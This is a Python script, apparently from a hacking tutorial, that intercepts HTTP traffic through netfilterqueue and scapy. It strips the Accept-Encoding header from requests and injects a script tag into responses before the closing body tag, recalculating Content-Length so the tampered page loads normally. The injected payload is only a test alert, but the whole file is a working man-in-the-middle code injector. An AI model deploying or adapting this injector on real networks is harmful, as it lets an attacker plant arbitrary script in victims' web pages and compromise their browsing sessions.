#!/usr/bin/env python3
import netfilterqueue
import scapy.all as scapy
import re

INJECTION = b"<script>alert('test');</script>"

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
        payload = scapy_packet[scapy.Raw].load

        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] Request")
            modified_load = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", payload)
            new_packet = set_load(scapy_packet, modified_load)
            packet.set_payload(bytes(new_packet))  

        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response")
            if b"</body>" in payload:  
                modified_load = payload.replace(b"</body>", INJECTION + b"</body>")

                delta = len(modified_load) - len(payload)
                modified_load = re.sub(
                    b"Content-Length: (\\d+)",
                    lambda m: b"Content-Length: " + str(int(m.group(1)) + delta).encode(),
                    modified_load
                )

                new_packet = set_load(scapy_packet, modified_load)
                packet.set_payload(bytes(new_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
try:
    queue.bind(0, process_packet)
    print("[*] Code Injector listening on NFQUEUE 0... Ctrl+C to stop.")
    queue.run()
except KeyboardInterrupt:
    print("\n[!] Stopping injector...")
finally:
    queue.unbind()